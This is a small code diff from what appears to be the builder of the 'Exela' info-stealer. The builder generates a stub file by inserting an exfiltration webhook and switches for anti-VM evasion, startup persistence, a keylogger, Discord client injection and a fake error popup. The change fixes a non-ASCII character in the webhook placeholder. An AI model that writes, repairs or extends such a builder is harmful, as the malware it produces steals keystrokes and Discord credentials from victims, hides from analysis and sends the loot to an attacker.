@@ -151,7 +151,7 @@ class Builder:
         with open("Exela.py", "r",encoding="utf-8", errors="ignore") as file:
             data = file.read()
         
-        replaced_data = data.replace("%REPLACE_ME_FOR_QUİCADXD%", str(self.Webhook)).replace("'%AnTiVm%'", str(self.UseAntiVM)).replace("'%StartupMethod%'", str(self.StartpMethod)).replace("'%Keylogger%'", str(self.UseKeylogger)).replace("'%Injection%'", str(self.UseDiscordInejction)).replace('"%fake_error%"', str(self.UseFakerError))                                                                
+        replaced_data = data.replace("%REPLACE_ME_FOR_QUICADXD%", str(self.Webhook)).replace("'%AnTiVm%'", str(self.UseAntiVM)).replace("'%StartupMethod%'", str(self.StartpMethod)).replace("'%Keylogger%'", str(self.UseKeylogger)).replace("'%Injection%'", str(self.UseDiscordInejction)).replace('"%fake_error%"', str(self.UseFakerError))                                                                
 
         with open("stub.py", "w", encoding="utf-8", errors="ignore") as file:
             file.write(replaced_data)
